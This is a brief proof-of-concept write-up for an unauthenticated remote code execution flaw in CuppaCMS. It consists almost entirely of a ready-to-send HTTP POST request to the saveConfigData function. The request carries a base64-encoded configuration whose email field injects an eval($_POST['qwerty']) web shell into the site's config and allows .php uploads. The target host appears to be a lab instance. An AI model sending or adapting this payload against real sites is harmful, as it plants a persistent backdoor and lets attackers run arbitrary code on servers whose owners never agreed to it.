# CuppaCMS_RCE
An Unauthorized attacker can execute arbitrary php code leading to unauthorized remote code execution

####poc
```bash
POST /classes/ajax/Functions.php HTTP/1.1
Host: eci-2zed9dw5fidnh19hu5vu.cloudeci1.ichunqiu.com
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 1141
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: country=us; language=en; administrator_path=http%3A%2F%2Feci-2zed9dw5fidnh19hu5vu.cloudeci1.ichunqiu.com%2F; administrator_document_path=%2F; menu_collapsed=true
Origin: http://eci-2zed9dw5fidnh19hu5vu.cloudeci1.ichunqiu.com
Referer: http://eci-2zed9dw5fidnh19hu5vu.cloudeci1.ichunqiu.com/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
sec-ch-ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"

file=eyJhZG1pbmlzdHJhdG9yX3RlbXBsYXRlIjoiZGVmYXVsdCIsImxpc3RfbGltaXQiOiIyNSIsImZvbnRfbGlzdCI6IlJhbGV3YXkiLCJzZWN1cmVfbG9naW4iOiIwIiwic2VjdXJlX2xvZ2luX3ZhbHVlIjoiIiwic2VjdXJlX2xvZ2luX3JlZGlyZWN0IjoiIiwibGFuZ3VhZ2VfZGVmYXVsdCI6ImVuIiwiY291bnRyeV9kZWZhdWx0IjoidXMiLCJnbG9iYWxfZW5jb2RlIjoic2hhMVNhbHQiLCJnbG9iYWxfZW5jb2RlX3NhbHQiOiJhYSIsInNzbCI6IjAiLCJsYXRlcmFsX21lbnUiOiJleHBhbmRlZCIsImJhc2VfdXJsIjoiIiwiYXV0b19sb2dvdXRfdGltZSI6IjMwIiwicmVkaXJlY3RfdG8iOiJmYWxzZSIsImhvc3QiOiJhYWEiLCJkYiI6ImFhYSIsInVzZXIiOiJhYWEiLCJwYXNzd29yZCI6ImFhYSIsInRhYmxlX3ByZWZpeCI6ImN1XyIsImFsbG93ZWRfZXh0ZW5zaW9ucyI6IiouZ2lmOyAqLmpwZzsgKi5qcGVnOyAqLnBkZjsgKi5pY287ICoucG5nOyAqLnN2ZzsqLnBocCIsInVwbG9hZF9kZWZhdWx0X3BhdGgiOiJ1cGxvYWRfZmlsZXMiLCJtYXhpbXVtX2ZpbGVfc2l6ZSI6IjUyNDI4ODAiLCJjc3ZfY29sdW1uX3NlcGFyYXRvciI6IiwiLCJ0aW5pZnlfa2V5IjoiIiwiZW1haWxfb3V0Z29pbmciOiJhXCI7fUBldmFsKCRfUE9TVFsncXdlcnR5J10pO2NsYXNzIGZjey8vIiwiZm9yd2FyZCI6IiIsInNtdHAiOiIwIiwiZW1haWxfaG9zdCI6IiIsImVtYWlsX3BvcnQiOiIiLCJlbWFpbF9wYXNzd29yZCI6IiIsInNtdHBfc2VjdXJpdHkiOiIiLCJjb2RlIjoiYWFhPSJ9&function=saveConfigData
```
